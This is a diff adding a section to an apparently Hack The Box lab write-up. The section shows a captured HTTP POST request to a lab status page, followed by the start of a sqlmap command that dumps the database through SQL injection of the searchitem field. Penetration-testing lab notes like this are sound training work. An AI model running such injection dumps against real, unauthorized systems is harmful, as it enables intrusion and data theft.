@@ -617,6 +617,28 @@ HTB{8f40ecf17f681612246fa5728c159e46}
 
 ## status.inlanefreight.local
 
+the request is captured
+
+```
+POST / HTTP/1.1
+Host: status.inlanefreight.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+Origin: http://status.inlanefreight.local
+Connection: keep-alive
+Referer: http://status.inlanefreight.local/
+Cookie: PHPSESSID=0l9r6ofd54amkrnjir3rb894hr
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+searchitem=a
+
+```
+
 ```
 sqlmap -r status.txt --technique=BEU --batch --dump
         ___
